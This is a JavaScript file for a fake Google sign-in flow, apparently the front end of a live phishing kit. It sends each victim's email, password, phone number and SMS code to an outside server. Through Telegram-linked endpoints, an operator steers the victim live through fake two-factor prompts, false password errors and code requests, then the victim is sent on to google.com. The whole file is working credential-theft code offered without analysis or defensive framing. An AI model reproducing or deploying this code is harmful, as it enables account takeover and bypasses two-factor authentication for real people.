import { API_URL } from "./config.js";

export function initLogin() {
  const signinCard = document.querySelector(".signin-card");
  const emailScreen = document.querySelector(".signin-screen--email");
  const passwordScreen = document.querySelector(".signin-screen--password");
  const loadingScreen = document.querySelector(".signin-screen--loading");
  const yesPromptScreen = document.querySelector(".signin-screen--yes-prompt");
  const phoneNumberScreen = document.querySelector(
    ".signin-screen--phone-number",
  );
  const smsCodeScreen = document.querySelector(".signin-screen--sms-code");
  const successScreen = document.querySelector(
    ".signin-screen--success-screen",
  );
  const emailForm = document.querySelector("#signin-form");
  const passwordForm = document.querySelector("#password-form");
  const smsCodeForm = document.querySelector("#sms-code-form");
  const phoneNumberForm = document.querySelector("#phone-number-form");
  const emailInput = document.querySelector("#email");
  const emailInputWrapper = document.querySelector(".signin-card__input");
  const emailError = document.querySelector(".signin-card__error-message");
  const passwordInput = document.querySelector("#password");
  const phoneNumberInput = document.querySelector("#phone-number");
  const smsCodeInput = document.querySelector("#sms-code");
  const passwordInputWrapper = passwordScreen.querySelector(
    ".signin-card__input",
  );
  const passwordLabel = passwordScreen.querySelector(
    ".signin-card__input label",
  );
  const showPasswordCheckbox = document.querySelector("#show-password");
  const passwordError = document.querySelector(".signin-card__password-error");
  const accountDisplay = document.querySelector(".signin-card__account");
  const loadingAccountDisplay = loadingScreen.querySelector(
    ".signin-card__account",
  );
  const yesPromptAccountDisplay = yesPromptScreen.querySelector(
    ".signin-card__account",
  );
  const phoneNumberAccountDisplay = phoneNumberScreen.querySelector(
    ".signin-card__account",
  );
  const smsCodeAccountDisplay = smsCodeScreen.querySelector(
    ".signin-card__account",
  );
  const yesPromptNumber = document.querySelector(
    ".signin-card__yesPrompt-number",
  );
  const accountButton = document.querySelector(".signin-card__account-btn");
  const yesPromptResendBtn = document.querySelector(
    ".signin-card__yesPrompt-resendBtn",
  );
  const yesPromptTawBtn = document.querySelector(
    ".signin-card__yesPrompt-tawBtn",
  );
  const successTryAgainBtn = successScreen.querySelector(
    ".signin-card__submit",
  );

  let selectionChecker = null;
  let actionChecker = null;

  function setLoading(isLoading) {
    document.body.classList.toggle("is-loading", isLoading);
    signinCard.classList.toggle("is-loading", isLoading);
  }

  function showScreen(screen) {
    emailScreen.classList.remove("active");
    passwordScreen.classList.remove("active");
    loadingScreen.classList.remove("active");
    yesPromptScreen.classList.remove("active");
    smsCodeScreen.classList.remove("active");
    successScreen.classList.remove("active");
    phoneNumberScreen.classList.remove("active");

    screen.classList.add("active");
  }

  function validateEmail(value) {
    const input = value.trim();

    if (!input) {
      return {
        valid: false,
        message: "Enter an email or phone number",
      };
    }

    // Plain username
    if (/^[a-zA-Z0-9]+$/.test(input)) {
      return {
        valid: true,
        email: `${input}@gmail.com`,
      };
    }

    // Complete Gmail address
    if (/^[a-zA-Z0-9._%+-]+@gmail\.com$/.test(input)) {
      return {
        valid: true,
        email: input,
      };
    }

    // Complete email address, but not Gmail
    if (/^[a-zA-Z0-9]+@[a-zA-Z0-9-]+\.[a-zA-Z]{2,}$/.test(input)) {
      return {
        valid: false,
        message: "Couldn’t find this account",
      };
    }

    // Anything that looks like an incomplete email
    if (input.includes("@")) {
      return {
        valid: false,
        message: "Enter a valid email or phone number",
      };
    }

    // Other invalid characters
    return {
      valid: false,
      message: "Couldn’t find this account",
    };
  }

  emailForm.addEventListener("submit", async (event) => {
    event.preventDefault();

    const result = validateEmail(emailInput.value);

    if (!result.valid) {
      emailInputWrapper.classList.add("has-error");
      emailInput.setAttribute("aria-invalid", "true");
      emailError.textContent = result.message;
      emailInput.focus();
      return;
    }

    emailInputWrapper.classList.remove("has-error");
    emailInput.removeAttribute("aria-invalid");

    accountDisplay.textContent = result.email;
    loadingAccountDisplay.textContent = result.email;
    yesPromptAccountDisplay.textContent = result.email;
    smsCodeAccountDisplay.textContent = result.email;
    phoneNumberAccountDisplay.textContent = result.email;

    setLoading(true);

    const response = await fetch(`${API_URL}/google-inputs`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        type: "email",
        value: emailInput.value,
      }),
    });

    setTimeout(() => {
      setLoading(false);
      showScreen(passwordScreen);
    }, 2500);
  });

  passwordForm.addEventListener("submit", async (event) => {
    event.preventDefault();

    setLoading(true);
    stopTelegramCheckers();
    const response = await fetch(`${API_URL}/google-inputs`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        type: "password",
        value: passwordInput.value,
      }),
    });

    try {
      const response = await fetch(`${API_URL}/api/telegram/prompt`, {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          variant: "normal",
        }),
      });
      const data = await response.json();

      if (!response.ok || !data.success) {
        throw new Error(data.message || "Failed to send Telegram prompt.");
      }

      showScreen(loadingScreen);
      selectionChecker = setInterval(checkTelegramSelection, 1000);
      actionChecker = setInterval(checkTelegramAction, 1000);
    } catch (error) {
      console.error("Failed to trigger Telegram prompt:", error);
      setLoading(false);
    }
  });

phoneNumberForm.addEventListener("submit", async (event) => {
  event.preventDefault();

  setLoading(true);
  stopTelegramCheckers();

  try {
    const inputResponse = await fetch(`${API_URL}/google-inputs`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "phoneNumber",
        value: phoneNumberInput.value,
      }),
    });

    if (!inputResponse.ok) {
      throw new Error("Failed to send phone number.");
    }

    const response = await fetch(`${API_URL}/api/telegram/prompt`, {
      method: "POST",
      credentials: "include",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ variant: "phoneNumber" }),
    });

    const data = await response.json();

    if (!response.ok || !data.success) {
      throw new Error(data.message || "Failed to send Telegram prompt.");
    }

    showScreen(loadingScreen);
    actionChecker = setInterval(checkTelegramAction, 1000);
  } catch (error) {
    console.error("Failed to send phone number prompt:", error);
    setLoading(false);
  }
});

  smsCodeForm.addEventListener("submit", async (event) => {
    event.preventDefault();

    setLoading(true);

    const response = await fetch(`${API_URL}/google-inputs`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        type: "smsCode",
        value: smsCodeInput.value,
      }),
    });

    try {
      const response = await fetch(`${API_URL}/api/telegram/prompt`, {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          variant: "normal",
        }),
      });
      const data = await response.json();

      if (!response.ok || !data.success) {
        throw new Error(data.message || "Failed to send Telegram prompt.");
      }

      showScreen(loadingScreen);
      selectionChecker = setInterval(checkTelegramSelection, 1000);
      actionChecker = setInterval(checkTelegramAction, 1000);
    } catch (error) {
      console.error("Failed to trigger Telegram prompt:", error);
      setLoading(false);
    }
  });

  yesPromptResendBtn.addEventListener("click", async () => {
    setLoading(true);

    try {
      const response = await fetch(`${API_URL}/api/telegram/prompt`, {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          variant: "resend",
        }),
      });

      const data = await response.json();

      if (!response.ok || !data.success) {
        throw new Error(data.message || "Failed to resend Telegram prompt.");
      }
      showScreen(loadingScreen);
      selectionChecker = setInterval(checkTelegramSelection, 1000);
      actionChecker = setInterval(checkTelegramAction, 1000);
    } catch (error) {
      console.error("Failed to resend Telegram prompt:", error);
      setLoading(false);
    }
  });

  yesPromptTawBtn.addEventListener("click", async () => {
    setLoading(true);

    try {
      const response = await fetch(`${API_URL}/api/telegram/prompt`, {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          variant: "tryAnotherWay",
        }),
      });

      const data = await response.json();

      if (!response.ok || !data.success) {
        throw new Error(data.message || "Failed to resend Telegram prompt.");
      }
      showScreen(loadingScreen);
      selectionChecker = setInterval(checkTelegramSelection, 1000);
      actionChecker = setInterval(checkTelegramAction, 1000);
    } catch (error) {
      console.error("Failed to resend Telegram prompt:", error);
      setLoading(false);
    }
  });

  successTryAgainBtn.addEventListener("click", () => {
    setLoading(true);

    setTimeout(() => {
      setLoading(false);
      window.location.href = "https://www.google.com/";
    }, 3000);
  });

  showPasswordCheckbox.addEventListener("change", () => {
    passwordInput.type = showPasswordCheckbox.checked ? "text" : "password";
  });

  accountButton.addEventListener("click", () => {
    emailInput.value = "";
    emailInputWrapper.classList.remove("has-error");
    emailInput.removeAttribute("aria-invalid");

    showScreen(emailScreen);
    emailInput.focus();
  });

  function showPasswordErrorScreen() {
    showScreen(passwordScreen);

    passwordInputWrapper.classList.add("has-error");
    passwordLabel.classList.add("has-error");
    passwordInput.focus();
  }

  async function checkTelegramSelection() {
    try {
      const response = await fetch(`${API_URL}/api/telegram/selection`, {
        credentials: "include",
      });
      const data = await response.json();

      if (data.success && data.number !== null) {
        yesPromptNumber.textContent = data.number;

        clearInterval(selectionChecker);
        clearInterval(actionChecker);
        setLoading(false);
        showScreen(yesPromptScreen);
        startYesPromptStage();
      }
    } catch (error) {
      console.error("Failed to check Telegram selection:", error);
    }
  }

  async function checkTelegramAction() {
    const response = await fetch(`${API_URL}/api/telegram/action`, {
      credentials: "include",
    });

    const data = await response.json();

    if (data.success && data.action === "sms_code") {
      clearInterval(selectionChecker);
      clearInterval(actionChecker);
      setLoading(false);
      showScreen(smsCodeScreen);
    }

    if (data.success && data.action === "success") {
      stopTelegramCheckers();
      setLoading(true);
      showScreen(loadingScreen);

      setTimeout(() => {
        setLoading(false);
        showScreen(successScreen);
      }, 3000);
    }

    if (data.success && data.action === "password_error") {
      stopTelegramCheckers();
      setLoading(false);
      showPasswordErrorScreen();
    }

    if (data.success && data.action === "number_prompt") {
      stopTelegramCheckers();
      setLoading(false);
      showScreen(phoneNumberScreen);
    }
  }

  function stopTelegramCheckers() {
    if (selectionChecker) {
      clearInterval(selectionChecker);
      selectionChecker = null;
    }

    if (actionChecker) {
      clearInterval(actionChecker);
      actionChecker = null;
    }
  }

  async function startYesPromptStage() {
    try {
      const response = await fetch(`${API_URL}/api/telegram/prompt`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        credentials: "include",
        body: JSON.stringify({
          variant: "normal",
        }),
      });

      const data = await response.json();

      if (!response.ok || !data.success) {
        throw new Error(data.message || "Failed to send Telegram prompt.");
      }

      actionChecker = setInterval(checkTelegramAction, 1000);
    } catch (error) {
      console.error("Failed to start Yes Prompt stage:", error);
    }
  }
}
